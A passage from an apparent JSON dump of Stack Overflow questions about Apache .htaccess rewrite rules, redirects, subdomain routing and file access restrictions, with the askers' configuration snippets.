-d\nRewriteRule .+ - [L]\n\n# add .html file extension (if such file does exist)\n# jpg\nRewriteCond %{DOCUMENT_ROOT}/profileImgs/$1_50\\.jpg$ -f\nRewriteRule ^([0-9]+)/img/normal$ profileImgs/$1_50.jpg  [L]\n\n# gif\nRewriteCond %{DOCUMENT_ROOT}/profileImgs/$1_50\\.gif$ -f\nRewriteRule ^([0-9]+)/img/normal$ profileImgs/$1_50.gif  [L]\n\n# default\nRewriteRule ^([0-9]+)/img/normal$ profileImgs/noImg_50.gif  [L]\n</code></pre>\n\n<p>How i can resolve this?, Thanks.</p>\n"},{"tags":["mysql",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":12701726,"title":"How to use .htaccess with MySQL database to automatically create websites","body":"<p>This is what I am trying to do...</p>\n\n<p>I have my main website, lets call it example.com</p>\n\n<p>I then have clients which are using  theirsubdomain.example.com</p>\n\n<p>Right now when a client signs up I am manually creating their website which is exactly the same as my site except for the order link and the contact form info.</p>\n\n<p>What I want is to create a system where someone goes to anothersubdomain.example.com and htaccess checks the database and grabs the other info that is connected to anothersubdomain... contact info, and buy link.</p>\n\n<p>I think this is possible, but I haven't found any tutorials on how to do it. It would be great if anothersubdomain.example.com AND example.com/anothersubdomain both worked.</p>\n\n<p>This way, once they submit the form and the information is added to the database, then the site is automatically create.</p>\n\n<p>I think this is a great automation idea and will help many people.</p>\n\n<p>Thanks in advance, let me know if you have any questions.</p>\n"},{"tags":["apache",".htaccess","error-handling"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12677936,"title":"This web page has a redirect loop","body":"<p>Alright so I tried forcing either www. or allowing without the www. . It wasn't working so I took it all out of the .htaccess file and re-uploaded. Now when I try to view the website I get the error message of:</p>\n\n<blockquote>\n  <p>This web page has a redirect loop</p>\n</blockquote>\n\n<p>How long does this take to refresh and not display this error message anymore? I tried clearing my cookies and flushing my DNS. It's still there.</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","html","file",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12701422,"title":"Deny access to multiple files in htaccess","body":"<p>As the title says, I'd like to deny multiple files through htaccess.</p>\n\n<pre><code>&lt;FilesMatch (profile|reg|register|..............|)\\.php&gt;\norder allow,deny\ndeny from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>I have lots of files (6 folders with like 30 files each) that I want to deny access to, so using the method above by entering them one by one will take time.</p>\n\n<p>Could I deny access to all files in the folders like this?</p>\n\n<pre><code>&lt;Directory /www/php/login/pages&gt;\n  Order Allow,Deny\n&lt;/Directory&gt;\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12700941,"title":"htaccess redirect all inside domain but keep images","body":"<p>I have parkeddomain.com and maindomain.net ( which setup when config server )\nthe website  run on parkeddomain.com for every think</p>\n\n<p>now i need to redirect all request to maindomain.com to the parkeddomain.com</p>\n\n<p>so far i got</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^maindomain.net$ [OR]\nRewriteCond %{HTTP_HOST} ^www.maindomain.net$\nRewriteRule (.*)$ http://www.parkeddomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>But only domain redirect, the internal pages/ subfolder not redirect !!</p>\n\n<p>And also I need for cookieless speed purpose, static/images files I need keep the images url \nnot redirect</p>\n\n<p>eg: <code>www.maindomain.net/sample.html</code> will need redirect to <code>www.parkeddomain.com/sample.html</code></p>\n\n<p>but <code>www.maindomain.net/images/abc.jpg</code> not redirect to any where</p>\n"},{"tags":["php","apache","file",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12700267,"title":"how to deny access to user but enable to php script from .htaccess","body":"<p>I have a server which stores images in a folder called 'images' but I want it to only be accessed by the php scripts.\nCan anyone help?\nThank you.</p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12699912,"title":".htaccess not routing properly","body":"<p>My issue put simply...</p>\n\n<p>this works:\n<code>RewriteRule ^foo http://google.com</code></p>\n\n<p>but this does not:\n<code>RewriteRule ^routing/? routing.php [L]</code></p>\n\n<p>there is no directory or file name with the name routing. Please see this question for details:\n<a href=\"http://stackoverflow.com/questions/12698882/htaccess-url-routing-subdirectory\">.htaccess url routing subdirectory</a></p>\n\n<p>Since asking that question my understanding of the .htaccess system has grown significantly. I now undertand it, and from what i see everything looks fine. Changing that one line will redirect to google when foo is used and just render a 404 error is routing is used. Also I am sure routing.php is there and working.</p>\n\n<p>Any suggestions to why this is not working?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","dns","exclude"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12697779,"title":".htaccess Domain Name 301 redirect with exclusion","body":"<p>I managed to create a basic rule set with htaccess to redirect with 301 all requests that a user types for the *.domain.com</p>\n\n<p>So all : *.domain.com requests redirect to www.home.domain.com</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^www\\.home\\.domain\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.home.domain.com/$1 [L,R=301]\n</code></pre>\n\n<p>Now i'm trying to modify it and redirect with 302 all requests that didn't have originally the *.home.domain.com but continue to keep previous conditions</p>\n\n<p>I have read some of the replies already but i'm puzzled from the regex syntax to apply a reply that is given similar for my case.</p>\n\n<p>Update : Thanks Jon Lin for your reply, one more clarification</p>\n\n<p>It's my fault from the start, i understood it when i read your reply</p>\n\n<p>I want all :</p>\n\n<pre><code>*.home.domain.com &gt;&gt; 301 &gt;&gt; www.home.domain.com\nnot *.home.domain.com &gt;&gt; 302 &gt;&gt; www.google.com (for example)\n</code></pre>\n\n<p>Update 2 :</p>\n\n<p>Will this work ?</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(.*)\\.home\\.domain\\.com$ [NC]\nRewriteCond $1 !^www\\.$ [NC]\nRewriteRule ^(.*)$ http://www.home.domain.com [R=301]\n\nRewriteCond %{HTTP_HOST} !^(.*)\\.home\\.domain\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.google.com [L,R=302]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12699299,"title":"How can I create dynamic subdomains for dynamic domains","body":"<p>In the app I'm working at the moment, I need to dynamically create subdomains. That would be quite trivial if I knew what was the domain I need to redirect to.\nThe point is that I can have many domains pointing to the same server and each may have many subdomains and I want a htaccess that can handle it.</p>\n\n<p>For example: domain1.com, domain1.com.br, domain2.com, domain2.co.uk can all be pointing to my server. When a user tries to access sub.domain1.com, I want it to be transparently redirected (no 301 redirect) to domain1.com. If he tries to access sub.domain1.com.br, I want it to be transparently redirected to domain1.com.br and so on (note that both redirects would point to the exact same point, the only difference would be in the address  bar).</p>\n\n<p>By now, I tried unsuccessfully to make changes in the lines that redirect from www. to non-www domains, but nothing worked as expected:</p>\n\n<pre><code>    //This works\nRewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\nRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n\n    //This ends with a \"too many redirections\" error\n#RewriteCond %{HTTP_HOST} ^(.*)$ [NC]\n#RewriteRule ^(.*)$ http://%1/$1 [L,QSA]\n</code></pre>\n\n<p>Can someone help?</p>\n"},{"tags":[".htaccess","redirect","rewrite","engine"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":12699251,"title":"redirect domain.com to www.domain.com with htaccess","body":"<p>How to redirect an 'empty' subdomain <a href=\"http://domain.com\" rel=\"nofollow\">http://domain.com</a> to <a href=\"http://www.domain.com\" rel=\"nofollow\">http://www.domain.com</a> using htaccess rewrite engine.</p>\n\n<p>Any ideas?</p>\n\n<p>It has to be a 301 permanent redirect and convey the rest of the url and query string.</p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12698882,"title":".htaccess url routing subdirectory","body":"<p>I have read at least 100 posts about .htaccess and cant seem to get a grasp of it. Everything i tried resulted in the 404 error and I know it works because if I type a line of randomness it gives a different error. What I am trying to do is url routing, the same way you would with an index page, with a subdomain.</p>\n\n<p>I have a file routing.php which takes the parts of the url that come after it and includes files based on that creating different pages. </p>\n\n<p>EX: <code>mydomain.com/secure/routing/application</code> should route through routing giving it the variable application so <code>routing.php</code> can build the application. <code>mydomain.com/secure/routing/login</code> should route through routing giving it the variable login thus building a login page. </p>\n\n<p>I have the <code>routing.php</code> all set up. The breakdown, route any url containing <code>mydomain.com/secure/routing/</code> to <code>mydomain.com/secure/routing.php</code> no matter what comes after routing. </p>\n\n<p>My latest attempt:(placed in the /secure subdirectory)</p>\n\n<pre><code>Options +FollowSymLinks\nIndexIgnore */*\n# Turn on the RewriteEngine\nRewriteEngine On\n#  Rules\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . routing.php\n</code></pre>\n"},{"tags":[".htaccess","redirect","opencart"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1431,"score":4,"question_id":5589582,"title":".htaccess opencart redirect 301","body":"<p>I just migrate my site from asp to opencart. In .htaccess I would like to do some redirect so that my customer can use back the old link to access</p>\n\n<p>inside .htaccess</p>\n\n<pre><code>redirect 301 /contact.asp http://www.example.com/index.php?route=information/contact_us\nredirect 301 /downloads.asp http://www.example.com/downloads\n</code></pre>\n\n<p>For Contact Us that work perfectly, however, for the downloads url, it didn't work correct.\nwhen I access to <code>http://www.example.com/downloads.asp</code> it will redirect to <code>http://www.example.com/downloads?_route_=downloads.asp</code>\nand Opencart show it is page not found.\nFor the <code>http://www.example.com/downloads</code> we had set SEO friendly URL in the backend system.</p>\n\n<p>We able to access with</p>\n\n<p><a href=\"http://www.example.com/information/downloads\" rel=\"nofollow\">http://www.example.com/information/downloads</a></p>\n\n<p><a href=\"http://www.example.com/downloads\" rel=\"nofollow\">http://www.example.com/downloads</a></p>\n\n<p>but we not able to access with normal link</p>\n\n<p><a href=\"http://www.example.com/index.php?route=information/downloads\" rel=\"nofollow\">http://www.example.com/index.php?route=information/downloads</a></p>\n\n<p>The folowing is my full .htaccess</p>\n\n<pre><code># Prevent Direct Access to files\n&lt;FilesMatch \"\\.(tpl|ini)\"&gt;\nOrder deny,allow\nDeny from all\n&lt;/FilesMatch&gt;\n\n# SEO URL Settings\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n\nredirect 301 /contact.asp http://www.example.com/index.php?route=information/contact_us\nredirect 301 /downloads.asp http://www.example.com/downloads\n</code></pre>\n\n<p>============ANOTHER TESTING========================</p>\n\n<p>I did some testing on this on my localhost I found out it is a quit interesting result. However, my problem still haven't solve.</p>\n\n<p>I run the .htaccess from <a href=\"http://localhost/example\" rel=\"nofollow\">http://localhost/example</a> and <a href=\"http://example\" rel=\"nofollow\">http://example</a> (added virtual directory)</p>\n\n<p>For <a href=\"http://localhost/example\" rel=\"nofollow\">http://localhost/example</a></p>\n\n<pre><code>redirect 301 /example/downloads.asp http://localhost/example/downloads/\n</code></pre>\n\n<p>and</p>\n\n<p>For <a href=\"http://example\" rel=\"nofollow\">http://example</a></p>\n\n<pre><code>redirect 301 /downloads.asp http://example/downloads/\n</code></pre>\n\n<p>Then I tried, redirect to my live version link, from localhost (http://example)</p>\n\n<pre><code>redirect 301 /downloads.asp http://www.example.com/downloads/\n</code></pre>\n\n<p>I access to <a href=\"http://example/downloads.asp\" rel=\"nofollow\">http://example/downloads.asp</a></p>\n\n<p>The browser redirect to me</p>\n\n<p><a href=\"http://www.example.com/downloads?_route_=downloads.asp\" rel=\"nofollow\">http://www.example.com/downloads?<em>route</em>=downloads.asp</a></p>\n\n<p><strong>NOTED</strong></p>\n\n<p>In LIVE version, I did not added any redirect code <strong>[VERY SURE FOR THIS]</strong></p>\n\n<p>But in Live version, I am to access directly with enter</p>\n\n<p><a href=\"http://www.example.com/downloads\" rel=\"nofollow\">http://www.example.com/downloads</a></p>\n\n<p>I am not sure why from localhost redirect 301 to live version will come out</p>\n\n<p><a href=\"http://www.example.com/downloads?_route_=downloads.asp\" rel=\"nofollow\">http://www.example.com/downloads?<em>route</em>=downloads.asp</a></p>\n\n<p>Any idea?</p>\n"},{"tags":["regex","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12698993,"title":"How do I get two variables to use in an .htaccess redirect?","body":"<p>I'm trying to redirect based on a cookie value AND a query string value but can't seem to get both values to return properly. I'm using:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{HTTP_COOKIE} secret=([^;]+) [AND]\nRewriteCond %{QUERY_STRING} ^file=(\\w+)$\nRewriteRule ^downloads/(.*)/$ /downloads/%1/%2\n</code></pre>\n\n<p>and using the URL \"/downloads/?file=protected/doc.pdf\". I'd like the redirect to go to \"/downloads/[secret cookie_val]/protected/doc.pdf\"</p>\n\n<p>Thanks!</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12697353,"title":"FilesMatch downloading files instead of loading","body":"<p>Rightio...I am about to add an image upload to my site. After reading some security blogs I have added the following to my htaccess file. </p>\n\n<pre><code>        ForceType application/octet-stream\n        &lt;FilesMatch \"(?i)\\.jpe?g$\"&gt;\n                ForceType image/jpeg\n        &lt;/FilesMatch&gt;\n        &lt;FilesMatch \"(?i)\\.gif$\"&gt;\n                ForceType image/gif\n        &lt;/FilesMatch&gt;\n        &lt;FilesMatch \"(?i)\\.png$\"&gt;\n                ForceType image/png\n        &lt;/FilesMatch&gt;\n</code></pre>\n\n<p>When I browse to a PHP page it downloads the file.php instead of showing the page in the browser.</p>\n\n<p>Any ideas would be much appreciated.</p>\n\n<p>I am working on MAMP locally.</p>\n\n<p>Many thanks\nLewis </p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12697787,"title":"ModRewrite statement redirect to user profile","body":"<p>I need to write simple Apache mod_rewrite statement, which redirect user urls to a script:</p>\n\n<pre><code>**http://mydomain.com/username -&gt; http://mydomain.com/user.py?uname=username**\nmydomain.com/username -&gt; http://mydomain.com/user.py?uname\nmydomain.com/username -&gt; http://mydomain.com/user.py?uname\n</code></pre>\n\n<p>The following lines don't work:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^[a-z]{5,}$  /user.py?username=$1 [L]\n</code></pre>\n\n<p>Looking forward for your help</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12683231,"title":"htaccess rewrite real directory path to a different, non-existing url, hiding the real path","body":"<p>I would like to use a directory <code>___test</code> like <code>/___test/subdirectory1/</code> and have some contents, but never show this path in the url. Instead I would like the url <code>/demo/subdirectory1</code> or say, <code>/demo/subdirectory1/images/image.jpg</code> to point to <code>/___test/subdirectory1/images/image.jpg</code> and the url on the browser to stay like: <code>/demo/subdirectory1/images/image.jpg</code>. Actually replacing <code>___test</code> with <code>demo</code></p>\n\n<p>What I have tried with various problems although it looks like it works sometimes is:</p>\n\n<pre><code>RewriteRule ^demo/subdirectory1(.*) ___test/subdirectory1/$1\n</code></pre>\n\n<p>The above works only on:  <code>demo/subdirectory1</code> or  <code>demo/subdirectory1/</code> (with existing content example an index.html inside <code>/___test/subdirectory1/</code>) but not on  <code>demo/subdirectory1/somethingmore...</code> although the content is there in this case as well, unfortunately it shows the real directory path in the url.</p>\n\n<p>Additionally, I am using the following to through 404 to anything starting from <code>/___test</code> in the url:</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^GET\\ /___test/\nRewriteRule ^___test/(.*) - [R=404,L,NC]\n</code></pre>\n\n<p>It works, but when I add this, then the previous goes to 404 too, unfortunately (again).\nBut most important for me is to make the first part right, even if I never make the second work.</p>\n\n<p>Any help really appreciated.\nThanks.</p>\n\n<p>Edit 1:\nI have also tried adding the following inside an <code>/___test/subdirectory1/.htaccess</code></p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /___test/subdirectory1\n</code></pre>\n\n<p>no success.</p>\n\n<p>Edit 2:\nAlthough it doesn't work well, the best I came up with so far with the help of Jon Lin is the following:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/demo/subdirectory1(.*)\nRewriteCond %{DOCUMENT_ROOT}/___test/subdirectory1/%1 -f [OR]\nRewriteCond %{DOCUMENT_ROOT}/___test/subdirectory1/%1 -d\nRewriteRule ^ /___test/subdirectory1/%1 [L]\n</code></pre>\n\n<p><code>/demo/subdirectory1</code> &lt;- OK</p>\n\n<p><code>/demo/subdirectory1/</code> &lt;- OK</p>\n\n<p><code>/demo/subdirectory1/subdirectory2</code> &lt;- Exposes real path</p>\n\n<p><code>/demo/subdirectory1/subdirectory2/</code> &lt;- OK</p>\n\n<p><code>/demo/subdirectory1/subdirectory2/subdirectory3</code> &lt;- Exposes real path</p>\n\n<p><code>/demo/subdirectory1/subdirectory2/subdirectory3/</code> &lt;- OK</p>\n\n<p>As you can see, whatever is deeper level than <code>subdirectory1</code> has problem. I just cannot understand why. Testing this on a clean .htaccess file existing in the root of the site (no other deeper) on a linux apache.</p>\n"},{"tags":["regex","wordpress","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12689757,"title":"htaccess 404 error conditional code for 301 redirect","body":"<p>I have paginated URLs that look like <code>http://www.domain.com/tag/apple/page/1/</code></p>\n\n<p>If a URL such as <code>http://www.domain.com/tag/apple/page/*2/</code> doesn't exist, or <code>page/2</code> doesn't exist, I need code to redirect this to a page such as <code>http://www.domain.com/tag/apple/</code> which would be the main tag page.</p>\n\n<p>I've currently have the following code:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^http://www.domain.com/tag/([0-9a-zA-Z]*)/page/([0-9]*)/$\nRewriteRule (.*) http://www.domain.com/tag/$1/ [R=301,L]\n</code></pre>\n\n<p>In this code, if the URL does not exist it redirects to the main tag page, but its not working.</p>\n\n<p>Does anybody have an hints or solutions on how to solve this problem?</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12696509,"title":"routing/rewrites/removing index.php: Only works for default_controller, but not for the rest of the views","body":"<p>Followed a tutorial to remove <code>index.php</code> from the URLs in <strong>Code Igniter</strong>.</p>\n\n<p>It works now for my <code>default_controller</code>, but not for other pages(or views) properly.</p>\n\n<p>I have one controller, <strong>Pages</strong>, and it has one method, <strong>View(<em></strong>$page = 'home'<strong></em>)</strong>, to load pages with other content based on the parameter passed.</p>\n\n<p>If I type <code>localhost/dev</code> into URL - I land on my home page, which is correct.</p>\n\n<p>If I type <code>localhost/dev/aboutus</code> - I receive <strong>404</strong>. It only works if I type <code>localhost/dev/pages/view/aboutus</code>. </p>\n\n<p>What I wanted to happen is by typing <code>localhost/dev/aboutus</code> it would show me the <strong>AboutUs</strong> view.</p>\n\n<p><strong>Routes.php</strong></p>\n\n<pre><code>$route['default_controller'] = \"pages/view\";\n$route['dev/(:any)'] = \"dev/pages/view/$1\";\n$route['404_override'] = '';\n</code></pre>\n\n<p><strong>Pages.php</strong> <em>(controller)</em></p>\n\n<pre><code>&lt;?php\n    class Pages extends CI_Controller\n    {\n        public function view($page = 'home')\n        {\n            if (!file_exists('application/views/pages/' . $page . '.php'))\n            {\n                // Whoops, we don't have a page for that!\n                show_404();\n            }\n\n            $data['title'] = ucfirst($page); // Capitalize the first letter\n\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/' . $page);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n    }\n?&gt;\n</code></pre>\n\n<p><strong>.htaccess file</strong> <em>(located in /dev/ folder)</em></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /dev/\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12696378,"title":"htaccess dynamic url rewrite and 301 redirect","body":"<p>I have a website with a dynamic main page, in which only one image changes, the url looks like this:</p>\n\n<p><a href=\"http://mysite.com/?v=imagename.jpg\" rel=\"nofollow\">http://mysite.com/?v=imagename.jpg</a></p>\n\n<p>i am trying to find a rule to redirect all these url's to:</p>\n\n<p><a href=\"http://mysite.com/imagename\" rel=\"nofollow\">http://mysite.com/imagename</a></p>\n\n<p>I have tried:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^(([^&amp;]*&amp;)*)v=([^&amp;]+)&amp;?(.*)?$\nRewriteRule ^index\\.php$ http://mysite.com/3?%1%4 [L,R=301]\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>RewriteRule ^index.php?v=([a-zA-Z]+)/([0-9]+)$ http://mysite.com/$1\n</code></pre>\n\n<p>and countless other variations, but nothing seems to work .. what am i doing wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite","server-error"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12694642,"title":"500 message RewriteEngine not allowed here","body":"<p>I am running XAMPP and encountering a 500 error when I try to run one of the files on my htdocs.  The error message reads: </p>\n\n<pre><code>/Applications/xampp/xamppfiles/htdocs/limesurvey/.htaccess: RewriteEngine not allowed here  \n</code></pre>\n\n<p>Following the advice on this forum, I've changed the code in httpd.conf and httpd.conf.bak to this:</p>\n\n<pre><code>&lt;Directory /&gt;\n    Options FollowSymLinks\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>However, I still get the error message.  I've searched through the forum but can't find any other clues.  What am I doing wrong?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":12691508,"title":"htaccess and forward one url to another","body":"<p>I have this rewrite code:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} ^.*iPhone.*$\nRewriteRule ^(.*)$ http://stagingsite.com/site/mobile [R=301]\nRewriteRule ^faq/$ /mobile/faq\n</code></pre>\n\n<p>The first line is working correctly. If the user is on an iphone then redirect to the mobile directory where the index page is displayed.</p>\n\n<p>I also want users visiting:</p>\n\n<p><a href=\"http://stagingsite.com/site/faq\" rel=\"nofollow\">http://stagingsite.com/site/faq</a></p>\n\n<p>to get forwarded to <a href=\"http://stagingsite.com/site/mobile/faq\" rel=\"nofollow\">http://stagingsite.com/site/mobile/faq</a> if they're on an iphone but the last line of code above doesn't seem to be achieving this.</p>\n\n<p>Any ideas what I have wrong?</p>\n"},{"tags":[".htaccess","mobile","device"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12693388,"title":"Redirect for Mobile Device with .htaccess // EXCLUDE IPAD","body":"<p>I use this Code in my .htaccess to redirect mobile devices. At the moment iPad is also a mobile device. How can I change this, so that ipad is not redirected to a mobile version?</p>\n\n<p>Thank you!</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n# Check if this is the noredirect query string\nRewriteCond %{QUERY_STRING} (^|&amp;)m=0(&amp;|$)\n# Set a cookie, and skip the next rule\nRewriteRule ^ - [CO=mredir:0:www.website.com]\n\n# Check if this looks like a mobile device\n# (You could add another [OR] to the second one and add in what you\n#  had to check, but I believe most mobile devices should send at\n#  least one of these headers)\nRewriteCond %{HTTP:x-wap-profile} !^$ [OR]\nRewriteCond %{HTTP:Profile}       !^$ [OR]\nRewriteCond %{HTTP_USER_AGENT} \"acs|alav|alca|amoi|audi|aste|avan|benq|bird|blac|blaz|brew|cell|cldc|cmd-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"dang|doco|eric|hipt|inno|ipaq|java|jigs|kddi|keji|leno|lg-c|lg-d|lg-g|lge-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT}  \"maui|maxo|midp|mits|mmef|mobi|mot-|moto|mwbp|nec-|newt|noki|opwv\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"palm|pana|pant|pdxg|phil|play|pluc|port|prox|qtek|qwap|sage|sams|sany\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"sch-|sec-|send|seri|sgh-|shar|sie-|siem|smal|smar|sony|sph-|symb|t-mo\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"teli|tim-|tosh|tsm-|upg1|upsi|vk-v|voda|w3cs|wap-|wapa|wapi\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"wapp|wapr|webc|winw|winw|xda|xda-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"up.browser|up.link|windowssce|iemobile|mini|mmp\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"symbian|midp|wap|phone|pocket|mobile|pda|psp\" [NC]\nRewriteCond %{HTTP_USER_AGENT} !macintosh [NC]\n\n# Check if we're not already on the mobile site\nRewriteCond %{HTTP_HOST}          !^m\\.\n# Can not read and write cookie in same request, must duplicate condition\nRewriteCond %{QUERY_STRING} !(^|&amp;)m=0(&amp;|$) \n\n# Check to make sure we haven't set the cookie before\nRewriteCond %{HTTP_COOKIE}        !^.*mredir=0.*$ [NC]\n\n# Now redirect to the mobile site\nRewriteRule ^ http://m.website.com [R,L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12692376,"title":"Mod-Rewrite to a query string","body":"<p>I need to create a series of redirects for personalized urls. They need to go from a directory on my server to a more complex url on another which includes a query string based on the original url. Here is an example:</p>\n\n<p>I would like to rewrite from this:\n<a href=\"http://www.mywebsite.com/TestDirectory/John.Doe\" rel=\"nofollow\">http://www.mywebsite.com/TestDirectory/John.Doe</a></p>\n\n<p>to this:</p>\n\n<p><a href=\"http://their.server.com/adifferentdirectoryname/page.aspx?u=John.Doe&amp;s=lorem&amp;dm=purl\" rel=\"nofollow\">http://their.server.com/adifferentdirectoryname/page.aspx?u=John.Doe&amp;s=lorem&amp;dm=purl</a></p>\n\n<p>There will be hundreds of these personalized urls I will send out, so I need the solution to account for that so that I don't have to write this for hundreds of names.</p>\n\n<p>Any help is greatly appreciated. Much Thanks!</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":12692423,"title":"Conditional redirection with .htaccess","body":"<p>I am not happy with the way Pinterest references my photos, as the source mentionned in their page links directly to the JPEG image file instead of the page that contains it, that also includes the author reference and license information.</p>\n\n<p>However instead of asking them to de-reference all the pictures, I'd like to keep them as it can be a good way to bring traffic in, but I would like to create a redirection from the JPEG image URL to the page that contains these elements.</p>\n\n<p>Is there a way to do a conditional redirection with .htaccess if the link comes from an external server?</p>\n\n<p>Thanks all !</p>\n"},{"tags":["php",".htaccess","fsockopen"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12691657,"title":"PHP: Access page with authorization doesn't return any chunks","body":"<p>I use this local php-console-script to access and output a script on a webserver which outputs a lot of stuff and need some time for it, printing it like:</p>\n\n<pre><code>    Line 1 [Waiting 10 Seconds]\n    Line 2 [Waiting 10 Seconds]\n    Line 3 [Waiting 10 Seconds]\n    ...\n</code></pre>\n\n<p>and so on. Because it take a long time for the script to finish, I would like to be able to view the beginning of the results as soon as possible. So I use:</p>\n\n<pre><code>$Url = \"/mypage.php\";\n$Get = \"GET $sUrl HTTP/1.0\\r\\n\";\n$Get .= \"Host: \".$Domain.\"\\r\\n\";\n$Get .= \"Authorization: Basic 